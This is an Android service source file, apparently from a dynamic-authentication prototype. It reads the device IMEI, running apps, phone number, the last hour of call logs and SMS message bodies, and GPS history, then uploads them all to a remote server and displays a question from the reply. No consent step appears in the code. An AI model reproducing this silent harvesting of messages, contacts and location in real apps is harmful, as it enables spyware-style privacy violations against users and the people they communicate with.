package com.example.datacollector;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EncodingUtils;
import org.apache.http.util.EntityUtils;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;


public class Upload_info extends Service {

	private boolean running;
	private int count;
	private String IMEI;
	private String cpu_info;
	private String mem_info;
	private String proc_info_string;
	private String ip_address;
	private Process_info proc_info;
	private String phone_number;
	private String contact_info;
	private String sms_info;
	private String gps_info;
	private String result;
	// private GPS_info gps_info_object = new GPS_info();
	// private ArrayList<Process_item> process_info;
	private boolean IMEI_uploaded;
	private boolean cpu_info_uploaded;
	private boolean mem_info_uploaded;
	private boolean device_info_uploaded;
	private boolean dialog_pop = false;
	List<Map<String, Object>> process_info_obj = null;

	public Http_post hp = new Http_post();

	@Override
	public void onCreate() {

		super.onCreate();
		openGPSSettings();
		/**
		 * 获得设备信息
		 */
		/*
		 * IMEI = Basic_info.fetch_IMEI(getApplicationContext()); List<String>
		 * name = new ArrayList<String>(); List<String> value = new
		 * ArrayList<String>(); name.add("IMEI"); value.add(IMEI);
		 * Log.i("uploader", "IMEI is "+IMEI); hp.post(name, value);
		 * Log.i("uploader", "IMEI is uploaded"); IMEI_uploaded = true; String
		 * device_info = Basic_info.fetch_version_info() + "\n"; device_info =
		 * device_info + Basic_info.getDisplayMetrics(this) + "\n"; device_info
		 * = device_info + Basic_info.fetch_netcfg_info() + "\n"; device_info =
		 * device_info +
		 * Basic_info.fetch_tel_status(this.getApplicationContext()) + "\n";
		 * name.add("device_info"); value.add(device_info); hp.post(name,
		 * value); device_info_uploaded = true; Log.i("uploader",
		 * "device_info is uploaded");
		 */
		this.running = true;
		// Log.i("Upload_info_serv", "This service is created!");
		new Thread(new Runnable() {

			@Override
			public void run() {
				Log.i("Thread in serv", "the running is " + running);
				// TODO Auto-generated method stub

				while (running) {
					// Yang
					running = false;
					try {
						Thread.sleep(200);
					} catch (InterruptedException e) {
					}
					count++;

					if (IMEI != null)
						Log.i("uploader", "the IMEI is" + IMEI);

					Log.i("uploader", "Count is " + count);

					HttpPost request = new HttpPost("http://"
							+ Ip_addr.server_ip_address
							//+ "/bbb/storeMobileInfomation.php");
					 + "/DynAuth/storeMobileInfomation.php");
					List<NameValuePair> params = new ArrayList<NameValuePair>();

					// data constructor
					// IMEI OK
					IMEI = Basic_info.fetch_IMEI(getApplicationContext());

					// IP address OK
					try {
						ip_address = Ip_addr.getLocalIPAddress();
					} catch (SocketException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}

					// cpu_info OK
					cpu_info = Basic_info.fetch_cpu_info();

					// mem_info OK
					mem_info = Basic_info
							.getMemoryInfo(getApplicationContext());

					// process_info OK
					String tempString;
					proc_info_string = "";
					proc_info = new Process_info();
					proc_info.init_Process_info();
					for (int i = 0; i < proc_info.PMUList.size(); i++) {
						String[] item = proc_info.PMUList.get(i);
						tempString = changeFromPackagenameToAppName(item[proc_info.INDEX_APPNAME]);
						if (tempString.equals("(unknown)")) {
							continue;
						}
						tempString = changeFromPackagenameToAppName(item[proc_info.INDEX_APPNAME]);
						proc_info_string += tempString;
						proc_info_string += "\n";
					}

					// phone_number OK
					phone_number = getPhoneNumber();

					// call_history OK
					contact_info = getContactInfo();

					// SMS_history OK
					sms_info = getSmsInPhone();

					// GPS_info OK
					gps_info = readFileData("locationRR.txt");
					// writeNewFileData("locationRR.txt", "");

					params.add(new BasicNameValuePair("IMEI", IMEI));
					params.add(new BasicNameValuePair("cpu_info", cpu_info));
					params.add(new BasicNameValuePair("mem_info", mem_info));
					params.add(new BasicNameValuePair("ip_address", ip_address));
					params.add(new BasicNameValuePair("process",
							proc_info_string));
					params.add(new BasicNameValuePair("phone_number",
							phone_number));
					params.add(new BasicNameValuePair("contact_info",
							contact_info));
					params.add(new BasicNameValuePair("sms_info", sms_info));
					params.add(new BasicNameValuePair("gps_info", gps_info));

					Log.i("Yang", IMEI + "\n" + cpu_info + "\n" + mem_info
							+ "\n" + ip_address + "\n" + proc_info_string
							+ "\n" + phone_number + "\n" + contact_info + "\n"
							+ sms_info + "\n" + gps_info + "\n");
					try {
						// Log.i("echo", "here we go");
						request.setEntity(new UrlEncodedFormEntity(params,
								HTTP.UTF_8));
						HttpResponse response = new DefaultHttpClient()
								.execute(request);
						if (response.getStatusLine().getStatusCode() == 200) {
							result = EntityUtils.toString(response.getEntity());
							// Toast.makeText(this, result,
							// Toast.LENGTH_LONG).show();
							writeNewFileData("sql.txt", "");
							writeNewFileData("sql.txt", result);
							Log.i("echo", result);
						} else {
							Log.i("echo", "something wrong");
						}
					} catch (Exception e) {

						// Toast.makeText(this, e.getMessage().toString(),
						// Toast.LENGTH_LONG).show();
						Log.i("ghostli123456", e.getMessage().toString());
						e.printStackTrace();
					}

					// for dialog here
					dialog_pop = true;

					try {
						Thread.sleep(1000);
					} catch (InterruptedException e) {
					}

					openActivity(result);
				}
			}
		}).start();
	}

	public void openActivity(String result) {
		Intent intent = new Intent();
		// intent.setClassName("com.example.mulactivity",
		// "com.example.mulactivity.OtherActivity");
		intent.setClass(this, OtherActivity.class);
		// 2 intent.setClassName(this, "com.example.mulactivity.OtherActivity");
		// 3 intent.setComponent(new ComponentName(this, OtherActivity.class));
		intent.putExtra("lala", "gogo");
		intent.putExtra("lala2", 999);
		Bundle bundle = new Bundle();

		String[] result_array = result.split("\n");
		String[] array = result_array[0].split("&");
		bundle.putString("type", array[0].substring(1));
		bundle.putString("activity_id", array[1]);
		bundle.putString("question", result_array[1].substring(2));
		Log.i("ghostli123456", array[0].substring(1) + " ||| " + array[1]
				+ "|||" + result_array[1].substring(2));
		intent.putExtras(bundle);
		// startActivity(intent);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

		startActivity(intent);
		// setContentView(R.layout.asdfmain);
	}

	protected void onActivityResult(int requestCode, int resultCOde, Intent data) {
		String result = data.getStringExtra("result");
		String resulttt = String.valueOf(requestCode);
		Toast.makeText(this, resulttt, 1).show();
	}

	public String getSmsInPhone() {
		final String SMS_URI_ALL = "content://sms/";
		final String SMS_URI_INBOX = "content://sms/inbox";
		final String SMS_URI_SEND = "content://sms/sent";
		final String SMS_URI_DRAFT = "content://sms/draft";
		final String SMS_URI_OUTBOX = "content://sms/outbox";
		final String SMS_URI_FAILED = "content://sms/failed";
		final String SMS_URI_QUEUED = "content://sms/queued";

		StringBuilder smsBuilder = new StringBuilder();

		try {
			Uri uri = Uri.parse(SMS_URI_ALL);
			String[] projection = new String[] { "_id", "address", "person",
					"body", "date", "type" };
			Cursor cur = getContentResolver().query(uri, projection, null,
					null, "date desc"); // 获取手机内部短信

			if (cur.moveToFirst()) {
				int index_Address = cur.getColumnIndex("address");
				int index_Person = cur.getColumnIndex("person");
				int index_Body = cur.getColumnIndex("body");
				int index_Date = cur.getColumnIndex("date");
				int index_Type = cur.getColumnIndex("type");

				do {
					String strAddress = cur.getString(index_Address);
					// int intPerson = cur.getInt(index_Person);
					String name = cur.getString(index_Person);
					// String name=cur.getString(intPerson);
					String strbody = cur.getString(index_Body);
					long longDate = cur.getLong(index_Date);
					int intType = cur.getInt(index_Type);

					SimpleDateFormat dateFormat = new SimpleDateFormat(
							"yyyy-MM-dd hh:mm:ss");
					Date d = new Date(longDate);
					String strDate = dateFormat.format(d);

					String strType = "";
					if (intType == 1) {
						strType = "receive";
					} else if (intType == 2) {
						strType = "send";
					} else {
						strType = "null";
					}
					int testMinute = (int) ((System.currentTimeMillis() - longDate) / 1000 / 60);
					// Log.i("Test", "time: " +
					// Long.parseLong(cursor.getString(3))+"||"+System.currentTimeMillis()+"||"+testMinute);
					if (testMinute < 60) {
						// smsBuilder.append("[ ");
						smsBuilder.append(strAddress + "|");
						smsBuilder.append(name + "|");
						smsBuilder.append(strbody + "|");
						smsBuilder.append(strDate + "|");
						smsBuilder.append(strType);
						smsBuilder.append("\n");
					}
				} while (cur.moveToNext());

				if (!cur.isClosed()) {
					cur.close();
					cur = null;
				}
			} else {
				smsBuilder.append("no result!");
			} // end if

			// smsBuilder.append("getSmsInPhone has executed!");

		} catch (SQLiteException ex) {
			Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
		}

		return smsBuilder.toString();
	}

	public String getContactInfo() {
		StringBuilder contactBuilder = new StringBuilder();
		String strNumber, strName = "";
		int type;
		long callTime;
		Date date;
		String time = "";
		ContentResolver cr = getContentResolver();
		final Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
				new String[] { CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
						CallLog.Calls.TYPE, CallLog.Calls.DATE,
						CallLog.Calls.DURATION }, null, null,
				CallLog.Calls.DEFAULT_SORT_ORDER);
		String[] result = new String[cursor.getCount()];
		for (int i = 0; i < cursor.getCount(); i++) {
			cursor.moveToPosition(i);
			strNumber = cursor.getString(0); // 呼叫号码
			strName = cursor.getString(1); // 联系人姓名
			type = cursor.getInt(2); // 来电:1,拨出:2,未接:3 public static final int
										// INCOMING_TYPE = 1; public static
										// final int OUTGOING_TYPE = 2; public
										// static final int MISSED_TYPE = 3;
			long duration = cursor.getLong(4);
			SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
			date = new Date(Long.parseLong(cursor.getString(3)));
			time = sfd.format(date);
			// Log.i("Test", "time: " +
			// Long.parseLong(cursor.getString(3))+"||"+System.currentTimeMillis());
			// Log.i("Yang", "contact number:" + strNumber);
			// Log.i("Yang", "contact name: " + strName);
			// Log.i("Yang", "type: " + type);
			// Log.i("Yang", "date and time: " + time);
			// Date curDate = new Date(System.currentTimeMillis());// 获取当前时间
			int testMinute = (int) ((System.currentTimeMillis() - Long
					.parseLong(cursor.getString(3))) / 1000 / 60);
			// Log.i("Test", "time: " +
			// Long.parseLong(cursor.getString(3))+"||"+System.currentTimeMillis()+"||"+testMinute);
			if (testMinute < 60) {

				contactBuilder.append(type + "|" + strNumber + "|" + strName
						+ "|" + duration + "|" + time + "\n");
			}
		}
		return contactBuilder.toString();
	}

	public String changeFromPackagenameToAppName(String packageName) {
		final PackageManager pm = getApplicationContext().getPackageManager();
		ApplicationInfo ai;
		try {
			ai = pm.getApplicationInfo(packageName, 0);
		} catch (final NameNotFoundException e) {
			ai = null;
		}
		final String applicationName = (String) (ai != null ? pm
				.getApplicationLabel(ai) : "(unknown)");
		return applicationName;
	}

	private String getPhoneNumber() {
		TelephonyManager mTelephonyMgr;
		mTelephonyMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		return mTelephonyMgr.getLine1Number();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		this.running = false;
		Log.v("uploadService", "Destroyed");
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	public String readFileData(String fileName) {
		String res = "";
		try {
			FileInputStream fin = openFileInput(fileName);
			int length = fin.available();
			byte[] buffer = new byte[length];
			fin.read(buffer);
			res = EncodingUtils.getString(buffer, "UTF-8");
			fin.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return res;
	}

	public void writeFileData(String fileName, String message) {
		try {
			FileOutputStream fout = openFileOutput(fileName, MODE_APPEND);
			byte[] bytes = message.getBytes();
			fout.write(bytes);
			fout.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void writeNewFileData(String fileName, String message) {
		try {
			FileOutputStream fout = openFileOutput(fileName, MODE_PRIVATE);
			byte[] bytes = message.getBytes();
			fout.write(bytes);
			fout.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void openGPSSettings() {
		LocationManager alm = (LocationManager) this
				.getSystemService(Context.LOCATION_SERVICE);
		if (alm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
			// Toast.makeText(this, "GPS module is normal", Toast.LENGTH_SHORT)
			// .show();
			getLocation();
			return;
		}
		Log.i("iii", "KKKKKKK");
		// Toast.makeText(this, "Please open GPS!", Toast.LENGTH_SHORT).show();
		// Intent intent = new Intent(Settings.ACTION_SECURITY_SETTINGS);
		// startActivityForResult(intent, 0);
	}

	private void getLocation() {
		LocationManager locationManager;
		String serviceName = Context.LOCATION_SERVICE;
		locationManager = (LocationManager) this.getSystemService(serviceName);
		Criteria criteria = new Criteria();
		criteria.setAccuracy(Criteria.ACCURACY_FINE);
		criteria.setAltitudeRequired(false);
		criteria.setBearingRequired(false);
		criteria.setCostAllowed(true);
		criteria.setPowerRequirement(Criteria.POWER_LOW);
		String provider = locationManager.getBestProvider(criteria, true);
		Location location = locationManager.getLastKnownLocation(provider);
		saveToLocalFile(location);
		locationManager.requestLocationUpdates(provider, 2 * 1000, 10,
				locationListener);
	}

	private final LocationListener locationListener = new LocationListener() {
		public void onLocationChanged(Location location) {
			if (location != null) {
				saveToLocalFile(location);
			}
		}

		public void onProviderDisabled(String provider) {
		}

		public void onProviderEnabled(String provider) {
		}

		public void onStatusChanged(String provider, int status, Bundle extras) {
		}
	};

	private void saveToLocalFile(Location location) {
		Log.i("iii", "normal");
		SimpleDateFormat dateFormat = new SimpleDateFormat(
				"yyyy-MM-dd hh:mm:ss");
		Date d = new Date();
		String strDate = dateFormat.format(d);
		if (location != null) {
			double latitude = location.getLatitude();
			double longitude = location.getLongitude();
			double altitude = location.getAltitude();
			Log.i("iii", "normal1");
			writeFileData("locationRR.txt", latitude + "|" + longitude + "|"
					+ altitude + "|" + strDate + "\n");
		} else {
			Log.i("iii", "normal2");
			writeFileData("locationRR.txt", "no location available" + "\n");
		}
	}
}
